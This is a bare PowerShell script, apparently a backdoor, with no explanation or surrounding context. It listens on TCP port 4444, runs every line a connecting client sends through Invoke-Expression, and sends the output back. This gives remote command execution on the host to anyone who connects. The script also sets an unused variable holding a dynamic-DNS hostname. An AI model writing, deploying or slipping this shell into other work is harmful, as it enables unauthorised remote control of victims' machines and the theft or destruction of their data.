$port = 4444
$ip = "suber122.duckdns.org"

$listener = [System.Net.Sockets.TcpListener] $port
$listener.start()

while ($true)
{
    $client = $listener.AcceptTcpClient()
    $stream = $client.GetStream()

    $reader = New-Object System.IO.StreamReader($stream)
    $writer = New-Object System.IO.StreamWriter($stream)

    $writer.AutoFlush = $true

    while ($stream.Connected)
    {
        $data = $reader.ReadLine()
        if (!$data) { break }
        $sendback = (Invoke-Expression -Command $data 2>&1 | Out-String)
        $writer.WriteLine($sendback)
    }

    $client.Close()
}
